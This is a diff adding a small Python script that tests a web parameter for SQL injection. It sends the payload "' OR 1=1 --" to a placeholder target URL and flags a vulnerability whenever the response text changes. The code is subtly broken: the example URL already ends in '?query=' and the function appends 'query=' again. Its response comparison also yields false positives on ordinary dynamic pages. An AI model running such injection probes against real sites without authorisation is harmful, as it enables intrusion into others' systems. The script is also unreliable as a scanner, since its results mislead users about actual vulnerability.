@@ -1,0 +1,31 @@
+import requests
+
+def sql_injection_check(url, parameter, payload):
+  """Checks for SQL injection vulnerability in a given URL parameter.
+
+  Args:
+    url: The target URL.
+    parameter: The parameter to test.
+    payload: The SQL injection payload.
+
+  Returns:
+    True if a potential vulnerability is found, False otherwise.
+  """
+
+  original_response = requests.get(url + parameter + "=")
+  injected_response = requests.get(url + parameter + "=" + payload)
+
+  if original_response.text != injected_response.text:
+    return True
+  else:
+    return False
+
+if __name__ == "__main__":
+  url = "http://your_target_website.com/search?query="  # Replace with your target URL
+  parameter = "query"  # Replace with the target parameter
+  payload = "' OR 1=1 --"  # A simple SQL injection payload
+
+  if sql_injection_check(url, parameter, payload):
+    print("Potential SQL injection vulnerability found!")
+  else:
+    print("No SQL injection vulnerability detected.")
